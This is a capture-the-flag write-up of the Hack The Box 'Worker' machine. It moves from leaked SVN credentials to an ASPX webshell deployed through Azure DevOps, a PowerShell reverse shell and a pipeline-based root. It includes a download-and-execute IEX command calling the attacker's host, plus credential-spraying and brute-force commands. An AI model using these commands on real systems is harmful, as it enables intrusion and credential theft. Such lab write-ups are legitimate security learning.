# Worker

Details:
- Worker IP: 10.10.10.203
- Kali IP: 10.10.14.160
- Date of writeup: 12 March 2021

A hard box! Learned to use Azure DevOps for this one!

Sections:
- [Recon](#recon)
- [Inspecting svnserve](#inspecting-svnserve)
- [Azure DevOps](#azure-devops)
- [Reverse shell](#reverse-shell)
- [Getting the user](#getting-the-user)
- [Getting to root](#getting-to-root)
- [Learnings from ippsec walkthrough](#learnings-from-ippsec-walkthrough)

## Recon
Run nmap
```kali$  nmap -sC -sV 10.10.10.203```

![](images/Worker_1.png?raw=true)

There's a port that immediately caught my attention, port 3690. Let's start there.

## Inspecting svnserve
First thing I tried was to check if there was something in exploitdb that I could use.
 
```searchsploit svnserve```

Turns out there was something that sounded like it could work (svnserve_date) so I tried it. I now understand that attempting an attack blindly is reckless and most of the time it would be pointless as well. I had no version knowledge so this was bound to fail.   

![](images/Worker_3.png?raw=true)

I then tried what I should have done first. I said to myself "this is an SVN server, there must be some data I might be able to get from it". Sure enough, running ```svnrdump dump svn://10.10.10.203``` got me a lot of data.

While inspecting that data, I came across something very intersting:

![](images/Worker_5.png?raw=true)

Creds!! A bad commit like this (revision 3) can really get you in trouble. It seems 'nathen' figured it out eventually, but forgot to perform some cleanup actions.

So I got creds. Where to use them though? Maybe WinRM? (I verified the port was opened before attempting this)

![](images/Worker_7.png?raw=true)

Tough luck. Back to reconing.

I decided to start inspecting the pages being hosted at port 80. From the SVNServe dump I got a hostname ```dimension.worker.htb```, so I went ahead and added it to my hosts file.

![](images/Worker_13.png?raw=true)

I visited that page and after some browsing around, I found some more subdomains, which I also added to the hosts file.

![](images/Worker_11.png?raw=true)

![](images/Worker_12.png?raw=true)

I inspected these pages for a while and couldn't get anything. I went back to the SVNServe dump to see if I had missed anything and, sure enough:

![](images/Worker_16.png?raw=true)

Browsing to http://devops.worker.htb, I got a prompt for credentials. I wrote in nathen's credentials and got in!

![](images/Worker_17.png?raw=true)

![](images/Worker_18.png?raw=true)


## Azure DevOps
This part was tough! Azure's platform was new to me and I often found myself in trouble in it. I had a hard time understanding what was going on and how things worked, myself being used to other systems.

There was a lot of garbage to decieve you, but, finally, I got to understand the project structure and started analyzing the repositories. In the ```spectral``` repository, there was an interesting commit that later on got deployed.

![](images/Worker_22.png?raw=true)

![](images/Worker_21.png?raw=true)

You can see in the images that the web page was in fact running a version with the changes made, since it said "pure" instead of "awesome" geniuses.

The path was clear: upload something that will allow RCE. I first tried an ASP webshell https://github.com/BlackArch/webshells/blob/master/aspx/cmdasp.aspx

![](images/Worker_25.png?raw=true)

You need to create a Pull Request and approve it, but that's easy job:

![](images/Worker_24.png?raw=true)

Then launch the appropriate pipeline to release this. This was hard to do and unfortunately I don't recall how exactly I found the solution. If I ever get VIP access to HTB I'll retry this box and edit this section.

Anyhow, I eventually got to doing this

![](images/Worker_32.png?raw=true)

After the website is deployed, you can access the webshell at http://spectral.worker.htb/cmdasp.aspx

![](images/Worker_31.png?raw=true)
 
Great! We have RCE now. 

## Reverse shell

Getting a reverse shell should be easy now, shouldn't it? Well, it turned out that getting a _proper_ reverse shell wasn't that easy. My first attempts with a normal perl reverse shell looked like this

![](images/Worker_33.png?raw=true)

This is good, but kind of uncomfortable. So I tried with [nishang](https://github.com/samratashok/nishang) reverse shells. I used ```Invoke-PowerShellTcp``` and edited it so at the end it would call the main function:

![](images/Worker_35.png?raw=true)

I sent this file to the box by opening an HTTP server with Python3 and calling in the webshell: 
```
cmd.exe /c powershell IEX(New-Object net.webclient).downloadString('http://10.10.15.61:8083/rem.ps1')
```

![](images/Worker_36.png?raw=true)

## Getting the user

When I was trying my best to deploy the webshell to the Spectral repository, I noticed the following:

![](images/Worker_38.png?raw=true)

There's a ```W:``` drive. A quick look there showed me that the repositories are stored there, and there were plaintext credentials

![](images/Worker_37.png?raw=true)

I used ```crackmapexec``` to try these and eventually found that ```robisl``` is valid!

![](images/Worker_39.png?raw=true)

## Getting to root

I must confess here that I went hunting for some tips for this one. I spent a long time trying stuff and nothing seemed to work.

In the end, Azure DevOps was also the place to get to root. I created a Starter pipeline that I customized to call my nishang reverse shell script (```rem.ps1```)

![](images/Worker_44.png?raw=true)

![](images/Worker_43.png?raw=true)

![](images/Worker_41.png?raw=true)

## Learnings from ippsec walkthrough

- Bruteforces hostames with gobuster ```gobuster vhost -w wordlist -u URL```
- Uses tennc webshells [TODO] github link
- Uses nishang reverse shell as well, but executes it as an encoded powershell command ```cat Script.ps1 | iconv -t utf-16le | base64 -w 0```
- Also uses ```script``` command and ```rlwrap```
- ```crackmapexec winrm IP -u USERS -p PWD --no-bruteforce``` Only does one password per user
- He finds an unintended privesc path: the IIS user has the SeImpersonatePrivilege (```whoami /all```). Then runs - He finds an unintended privesc path: the IIS user has the SeImpersonatePrivilege (```whoami /all```). Then runs ```systeminfo``` to see the version of Windows the box is running and to know whether JuicyPotato / RoguePotato will work
    - https://github.com/antonioCoco/RoguePotato
    - https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/
    - Uses chisel.exe to open ports

 

